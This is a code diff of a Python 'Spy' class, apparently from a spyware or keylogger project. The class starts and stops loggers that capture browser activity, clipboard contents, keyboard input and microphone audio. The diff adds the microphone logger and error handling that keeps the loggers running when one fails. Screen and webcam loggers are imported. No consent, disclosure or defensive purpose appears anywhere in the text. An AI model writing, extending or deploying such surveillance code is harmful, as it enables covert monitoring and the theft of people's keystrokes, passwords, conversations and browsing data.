@@ -5,23 +5,30 @@ from core.loggers.microphone_logger import MicrophoneLogger
 from core.loggers.screen_logger import ScreenLogger
 from core.loggers.webcam_logger import WebcamLogger
 
+from config.config_loader import get_section_config
+from core.utils.file_utils import create_log_directories
+import os
 class Spy:
-    def __init__(self):
-        self.browser_logger = BrowserLogger()
-        self.clipboard_logger = ClipboardLogger()
-        self.input_logger = InputLogger()
 
-        self.loggers = []
-        self.loggers.extend([
-            self.browser_logger,
-            self.clipboard_logger,
-            self.input_logger
-        ])
+    def __init__(self):
+        self.logs = create_log_directories()
+        self.loggers = [
+            BrowserLogger(),
+            ClipboardLogger(),
+            InputLogger(),
+            MicrophoneLogger()
+        ]
 
     def start(self):
         for logger in self.loggers:
-            logger.start()
+            try:
+                logger.start()
+            except Exception as e:
+                print(f"Error starting {logger.__class__.__name__} logger: {e}")
 
     def stop(self):
         for logger in self.loggers:
-            logger.stop()
+            try:
+                logger.stop()
+            except Exception as e:
+                print(f"Error stopping {logger.__class__.__name__} logger: {e}")
